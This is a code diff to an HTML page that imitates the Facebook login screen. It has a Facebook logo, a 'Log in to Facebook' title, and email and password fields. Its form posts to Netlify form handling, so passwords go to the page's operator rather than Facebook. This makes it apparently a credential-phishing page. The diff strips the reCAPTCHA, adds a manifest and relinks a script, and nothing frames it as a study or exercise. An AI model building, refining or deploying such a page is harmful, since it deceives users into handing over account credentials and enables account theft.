@@ -10,6 +10,7 @@
     <link rel="shortcut icon" href="fb-logo.jpg" type="image/x-icon">
     <title>Log in to Facebook</title>
     <link rel="stylesheet" href="style.css">
+    <link rel="manifest" href="manifest.json">
 </head>
 
 <body>
@@ -18,7 +19,7 @@
 
     <div class="form-container">
 
-            <form name="form" method="POST" data-netlify-recaptcha="true" data-netlify="true" onsubmit="submit" netlify>
+            <form name="form" method="POST" data-netlify="true" onsubmit="submit" netlify>
 
                 <h3 class="heading-h3">Log in to Facebook</h3>
 
@@ -28,8 +29,6 @@
                     placeholder="Email address or phone number">
 
                 <input type="password" class="input-field" id="pwd" name="pwd" required placeholder="Password">
-                
-                <div data-netlify-recaptcha="true"></div>
 
                 <input type="submit" id="login" value="Log In">
 
@@ -41,6 +40,7 @@
 
             </form>
             </div>
-</body>
 
+        </body>
+        <script src="index.js"></script> 
 </html>
